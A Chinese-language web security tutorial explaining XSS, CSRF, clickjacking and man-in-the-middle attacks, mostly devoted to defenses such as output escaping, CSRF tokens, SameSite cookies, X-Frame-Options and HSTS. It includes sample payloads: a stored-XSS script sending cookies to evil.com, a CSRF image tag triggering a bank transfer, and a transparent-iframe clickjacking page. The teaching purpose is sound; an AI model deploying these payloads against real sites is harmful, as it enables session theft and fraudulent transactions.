---
title: Web 安全常见攻击
date: 2026-07-21
---

# Web 安全常见攻击

前端安全的核心是**防止用户数据被窃取、防止应用被恶意操控**。

## 一句话总结

**XSS 防注入、CSRF 防伪造、CSP 防执行**——前端安全三板斧。

## XSS（跨站脚本攻击）

### 原理

攻击者往页面里注入恶意脚本，其他用户浏览时脚本执行，窃取 Cookie、Session 等敏感信息。

### 三种类型

| 类型 | 存储位置 | 触发方式 | 危害 |
|------|---------|---------|------|
| **存储型** | 数据库/服务器 | 用户访问页面时自动执行 | 高，影响所有访问者 |
| **反射型** | URL 参数 | 用户点击恶意链接 | 中，需要诱导用户 |
| **DOM 型** | 前端 JS 逻辑 | 前端代码读取不安全数据 | 中，依赖前端实现 |

### 攻击示例

```javascript
// 存储型：评论区注入脚本
// 用户输入：<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// 其他用户访问评论区时，脚本执行，Cookie 被偷走

// 反射型：搜索框反射
// URL: https://example.com/search?q=<script>alert(document.cookie)</script>
// 页面直接渲染 q 参数，脚本执行
```

### 防御方案

| 方案 | 说明 | 适用场景 |
|------|------|---------|
| **转义输出** | 将 `<` `>` `&` `"` `'` 转为 HTML 实体 | 所有用户输入渲染到页面时 |
| **CSP 策略** | 限制脚本来源，禁止内联脚本 | 全局防护 |
| **HttpOnly Cookie** | JS 无法读取 Cookie | 敏感 Cookie |
| **输入过滤** | 过滤或拒绝危险字符 | 表单提交 |

```javascript
// 转义函数示例
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  }
  return str.replace(/[&<>"']/g, s => map[s])
}

// 使用
const userInput = '<script>alert(1)</script>'
element.innerHTML = escapeHtml(userInput)
// 渲染为：&lt;script&gt;alert(1)&lt;/script&gt;
```

## CSRF（跨站请求伪造）

### 原理

攻击者诱导用户在已登录状态下访问恶意页面，恶意页面自动向目标网站发送请求（如转账、改密码），利用的是浏览器的 Cookie 自动携带机制。

### 攻击示例

```html
<!-- 恶意网站：evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- 用户已登录 bank.com，访问 evil.com 时自动发送转账请求 -->
```

### 防御方案

| 方案 | 说明 | 实现方式 |
|------|------|---------|
| **CSRF Token** | 请求必须携带随机 token | 表单隐藏字段 / Header |
| **SameSite Cookie** | 限制 Cookie 跨站发送 | `Set-Cookie: SessionId=xxx; SameSite=Strict` |
| **验证 Referer** | 检查请求来源 | 服务端校验 |
| **二次确认** | 敏感操作需要密码/验证码 | 转账、改密等场景 |

```javascript
// CSRF Token 示例
// 1. 服务端生成 token 放入页面
<meta name="csrf-token" content="random-token-123">

// 2. 前端请求时携带 token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
  },
  body: JSON.stringify({ to: 'xxx', amount: 100 })
})
```

## 点击劫持（Clickjacking）

### 原理

攻击者用透明 iframe 覆盖目标网站，诱导用户点击看似无害的按钮，实际执行了隐藏操作。

### 攻击示例

```
┌─────────────────────────────────────────────────┐
│  恶意网站：evil.com                              │
│                                                 │
│  🎁 恭喜你！点击领取大奖！                        │
│  ┌─────────────────────────────────────────┐   │
│  │                                         │   │
│  │  [ 点击领取 ]  ← 用户看到的是这个按钮    │   │
│  │                                         │   │
│  │  ┌─────────────────────────────────┐   │   │
│  │  │  透明 iframe（银行转账页面）     │   │   │
│  │  │                                 │   │   │
│  │  │         [ 确认转账 ]            │   │   │
│  │  │         ↑ 实际点击的是这个       │   │   │
│  │  └─────────────────────────────────┘   │   │
│  └─────────────────────────────────────────┘   │
─────────────────────────────────────────────────┘
```

**攻击流程**：
1. 攻击者创建恶意页面，放一个诱人的按钮"点击领取大奖"
2. 在按钮上方覆盖一个透明的 iframe，加载银行的转账确认页面
3. iframe 中的"确认转账"按钮刚好和"点击领取"按钮位置重合
4. 用户以为自己在点"领取大奖"，实际点了"确认转账"

```html
<!-- 恶意页面 evil.com -->
<div style="position: relative; width: 200px; height: 100px;">
  <!-- 诱饵按钮 -->
  <button style="position: absolute; z-index: 1;"> 点击领取大奖</button>
  
  <!-- 透明 iframe，覆盖在按钮上方 -->
  <iframe 
    src="https://bank.com/transfer-confirm" 
    style="position: absolute; opacity: 0; width: 200px; height: 100px;"
  ></iframe>
</div>
```

### 防御方案

```javascript
// 方案 1：X-Frame-Options 响应头（服务端设置）
// X-Frame-Options: DENY        // 禁止任何 iframe 嵌入
// X-Frame-Options: SAMEORIGIN  // 只允许同源嵌入

// 方案 2：CSP frame-ancestors
// Content-Security-Policy: frame-ancestors 'self'

// 方案 3：前端检测（可被绕过，不推荐单独使用）
if (window.top !== window.self) {
  window.top.location = window.self.location
}
```

### 与 CSRF 的区别

点击劫持和 CSRF 都能达到"让用户非本意执行操作"的目的，但攻击手法不同：

| | CSRF | 点击劫持 |
|---|---|---|
| **攻击对象** | 请求 | 界面 |
| **请求来源** | 攻击者构造的假请求 | 用户点击的真实按钮 |
| **用户操作** | 可能完全无感（自动触发） | 必须手动点击 |
| **防御方式** | CSRF Token、SameSite Cookie | X-Frame-Options、CSP |

**CSRF 示例**：
```html
<!-- 攻击者构造的请求，用户访问即触发 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```
用户什么都没点，请求就发出去了。

**点击劫持示例**：
```html
<!-- 用户点的是真实银行页面的真实按钮 -->
<iframe src="https://bank.com/transfer-confirm"></iframe>
```
用户确实点了"确认转账"，但不知道自己点在 iframe 里。

两者经常结合使用：点击劫持是**手段**（诱导点击），CSRF 是**目的**（执行非本意操作）。

## 中间人攻击（MITM）

### 原理

攻击者在用户和服务器之间拦截、篡改通信内容。

### 防御方案

| 方案 | 说明 |
|------|------|
| **HTTPS** | 加密传输，防止窃听和篡改 |
| **HSTS** | 强制使用 HTTPS，防止降级攻击 |
| **证书固定** | 客户端校验服务器证书指纹 |

```javascript
// HSTS 响应头（服务端设置）
// Strict-Transport-Security: max-age=31536000; includeSubDomains
// 浏览器收到后，365 天内该域名强制用 HTTPS
```

## 常见误区

❌ **前端做安全校验就够了**
> 前端校验只防君子不防小人，所有安全校验必须在服务端重复执行。

❌ **用了 HTTPS 就绝对安全**
> HTTPS 防中间人，但防不了 XSS、CSRF 等应用层攻击。

❌ **Cookie 设了 HttpOnly 就万事无忧**
> HttpOnly 只防 XSS 偷 Cookie，CSRF 攻击中 Cookie 还是会正常发送。
